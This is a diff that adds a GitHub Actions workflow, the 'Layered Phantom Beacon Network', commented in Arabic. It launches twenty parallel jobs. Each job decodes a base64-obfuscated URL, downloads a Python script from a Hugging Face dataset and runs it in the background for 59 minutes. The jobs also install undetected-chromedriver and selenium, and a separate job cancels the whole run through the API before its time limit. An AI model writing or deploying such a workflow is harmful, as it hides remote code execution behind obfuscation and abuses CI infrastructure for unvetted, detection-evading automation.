@@ -1,0 +1,106 @@
+name: Layered Phantom Beacon Network
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: phantom-beacon-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # القيّم المطلق: يُطلق إشارة الإنهاء عند علامة 59 دقيقة بالضبط
+  # =================================================================
+  absolute-curator:
+    name: "Absolute Curator"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    steps:
+      - name: Prime Curator Trigger
+        run: |
+          echo "[CURATOR] Absolute curator engaged. Trigger primed at the 59-minute threshold."
+          echo "[CURATOR] Watching execution token: ${{ github.run_id }}"
+          
+          # فترة المراقبة المحددة (3540 ثانية = 59 دقيقة)
+          sleep 3540
+          
+          echo "[CURATOR] Threshold reached! Emitting curator trigger..."
+          
+          # بث أمر الإلغاء عبر GitHub API
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[CURATOR] Trigger emitted. Every live and pending beacon will be extinguished."
+
+  # =================================================================
+  # شبكة الشُعل المتوازية: تكوين وتشغيل عُقد الشُعل
+  # =================================================================
+  beacon-network:
+    name: "BeaconNode-${{ matrix.beacon_tag }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        beacon_tag: [501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520]
+
+    steps:
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ الومضة <1>: تركيب الأساس
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Install Foundation
+        run: |
+          echo "[FOUNDATION] Installing foundation for BeaconNode-${{ matrix.beacon_tag }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ الومضة <2>: سحب الكبسولة التنفيذية
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Pull Execution Capsule
+        run: |
+          echo "[PULL] Pulling beacon_capsule.py from assigned relay point..."
+          RELAY_POINT=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$RELAY_POINT" -o beacon_capsule.py
+          echo "[PULL] Execution capsule pulled."
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ الومضة <3>: تعبئة الطرود المساندة
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Load Auxiliary Parcels
+        run: |
+          echo "[LOAD] Loading auxiliary parcels..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ الومضة <4>: التنفيذ المقيّد بـ 59 دقيقة
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Ignite Timed Beacon
+        run: |
+          echo ">> Igniting BeaconNode-${{ matrix.beacon_tag }}..."
+          
+          # تشغيل العملية في الخلفية
+          python3 beacon_capsule.py &
+          BEACON_PID=$!
+          
+          echo ">> Timed beacon ignited. Interval: 59 minutes (3540s)."
+          
+          # الانتظار حتى انتهاء المدة المحددة (59 دقيقة بالضبط)
+          sleep 3540
+          
+          # فحص حالة العملية وإنهاؤها إن كانت لا تزال تعمل
+          if kill -0 $BEACON_PID 2>/dev/null; then
+            echo ">> Timed interval elapsed! Extinguishing beacon..."
+            kill -9 $BEACON_PID
+            echo ">> Beacon extinguished by interval keeper."
+          else
+            echo ">> Beacon faded within timed interval."
+          fi
